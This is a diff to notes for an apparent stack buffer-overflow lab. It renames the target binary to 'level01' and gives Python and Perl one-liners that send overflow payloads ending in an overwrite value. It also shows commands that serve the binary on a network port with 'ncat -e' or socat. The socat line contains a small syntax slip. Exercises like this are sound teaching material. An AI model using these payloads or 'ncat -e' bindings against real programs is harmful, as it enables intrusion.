@@ -1,16 +1,16 @@
 Commands that make this a lot easier
 =====================================
 
-Run stack1 with the output of a python command
-    ./stack1 $(python2 -c 'print("A"*112)')
+Run level01 with the output of a python command
+    ./level01 $(python2 -c 'print("A"*112)')
 
 
 Use Python2 to print bytes
-    ./stack1 $(python2 -c 'print("A"*64 + "\xba\xdd\xbe\xef")')
+    python2 -c 'print("A"*64 + "\xba\xdd\xbe\xef")' | ./level01
 
 
 Do it with perl (good to know since python3 encoding makes one liners awkward)
-    perl -e 'print "A"x64 . "\xba\xdd\xbe\xef". "\n"' | .stack1
+    perl -e 'print "A"x64 . "\xba\xdd\xbe\xef". "\n"' | ./level01
 
 *Note the "\n" at the end. Perl's print function doesn't send a new line unless specified.
 **Note that periods (.) replace (+) in perl when concatenating strings. No clue why
@@ -18,7 +18,7 @@ Do it with perl (good to know since python3 encoding makes one liners awkward)
 
 Connect the program to a socket using netcat:
 
-    ncat -e ./stack01 -lvnp 9000
+    ncat -e ./level01 -lvnp 9000
 
 Attackers connect with:
 
@@ -38,5 +38,5 @@ Legacy solution: add 'cat' to the command and enclose the payload in brackets:
 Better solution: Host the files with socat or make the previous quirk part of the lesson.
 The socat equivalent is:
 
-    socat TCP-LISTEN:9000.reuseaddr,fork EXEC:./stack1
+    socat TCP-LISTEN:9000.reuseaddr,fork EXEC:./level01
 
